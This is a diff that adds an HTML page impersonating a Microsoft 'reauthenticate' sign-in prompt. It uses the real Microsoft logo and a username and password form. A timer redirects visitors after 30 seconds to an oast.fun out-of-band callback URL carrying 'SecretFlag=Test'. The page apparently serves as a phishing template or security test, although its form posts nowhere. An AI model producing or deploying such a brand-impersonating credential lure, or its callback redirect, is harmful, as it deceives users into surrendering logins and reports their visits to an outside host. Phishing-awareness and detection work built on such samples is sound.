@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background-color: #ffffff;
+            border-radius: 5px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
+            padding: 20px;
+            width: 375px;
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        .info-box {
+            background-color: #007bff;
+            color: #fff;
+            padding: 20px;
+            border-radius: 5px 5px 0 0;
+            width: 100%;
+            text-align: center;
+        }
+
+        h2 {
+            margin: 0;
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+        }
+
+        button {
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+
+        p {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>You will need to reauthenticate to access this resource</h2>
+<img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"></img>
+<p></p>
+        <form action="#" method="post" id="loginForm">
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username" required>
+
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required>
+
+            <button type="submit">Login</button>
+        </form>
+        <p id="timer">Time until redirect: 30 seconds</p>
+    </div>
+
+    <script>
+        // JavaScript for displaying the timer and redirecting after 30 seconds
+        let seconds = 30;
+
+        function updateTimer() {
+            document.getElementById("timer").textContent = `Time until redirect: ${seconds} seconds`;
+
+            if (seconds === 0) {
+                window.location.href = "http://ckrk57m2vtc0000g9pz0gjhj1uhyyyyyb.oast.fun/SecretFlag=Test";
+            } else {
+                seconds--;
+                setTimeout(updateTimer, 1000); // Update every 1 second (1000 milliseconds)
+            }
+        }
+
+        updateTimer();
+    </script>
+</body>
+</html>
